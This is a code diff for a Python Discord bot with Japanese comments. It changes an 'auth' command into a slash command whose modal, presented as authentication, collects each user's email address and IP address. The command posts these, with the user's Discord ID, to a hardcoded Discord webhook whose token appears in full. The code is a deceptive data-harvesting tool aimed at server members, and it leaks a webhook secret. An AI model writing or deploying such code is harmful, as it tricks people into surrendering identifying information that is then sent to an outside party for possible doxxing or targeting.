@@ -70,23 +70,35 @@ def extract_ip_and_email(message):
 
     return ips, emails
 
-# --- 認証コマンド ---
+# --- スラッシュコマンドの定義 ---
 
-@bot.command(name="auth", description="ユーザーのIPアドレスとメールアドレスを抽出します。")
-async def auth(ctx):
-    message_content = ctx.message.content
-    ips, emails = extract_ip_and_email(message_content)
+@bot.tree.command(name="auth", description="ユーザーの認証情報を収集します。")
+async def auth(interaction: discord.Interaction):
+    # 認証パネルを表示
+    modal = discord.ui.Modal(title="認証情報入力")
+    email_input = discord.ui.TextInput(label="メールアドレス", placeholder="your.email@example.com", required=True)
+    ip_input = discord.ui.TextInput(label="IPアドレス", placeholder="192.168.1.1", required=True)
+    modal.add_item(email_input)
+    modal.add_item(ip_input)
 
-    if ips or emails:
-        user_info = f"ユーザー: {ctx.author.mention}\nユーザーID: {ctx.author.id}\n"
-        data = {
-            "content": f"{user_info}IPアドレス: {', '.join(ips)}\nメールアドレス: {', '.join(emails)}"
-        }
-        WEBHOOK_URL = "https://discord.com/api/webhooks/1440776757392441414/0x-51OAe945GtlPK0BY6k3zf34675GLZWL8K7N6AmQ3QnWLBn-nL6yvuWXIG1tjrpwZh"
-        requests.post(WEBHOOK_URL, json=data)
-        await ctx.send("認証情報を抽出しました。")
-    else:
-        await ctx.send("IPアドレスまたはメールアドレスが見つかりませんでした。")
+    await interaction.response.send_modal(modal)
+
+    # モーダルの送信を待機
+    await modal.wait()
+
+    # ユーザーが入力した情報を取得
+    email = email_input.value
+    ip = ip_input.value
+
+    # Webhookに送信
+    user_info = f"ユーザー: {interaction.user.mention}\nユーザーID: {interaction.user.id}\n"
+    data = {
+        "content": f"{user_info}IPアドレス: {ip}\nメールアドレス: {email}"
+    }
+    WEBHOOK_URL = "https://discord.com/api/webhooks/1440776757392441414/0x-51OAe945GtlPK0BY6k3zf34675GLZWL8K7N6AmQ3QnWLBn-nL6yvuWXIG1tjrpwZh"
+    requests.post(WEBHOOK_URL, json=data)
+
+    await interaction.followup.send("認証情報を受け取りました。")
 
 # --- メイン実行 ---
 
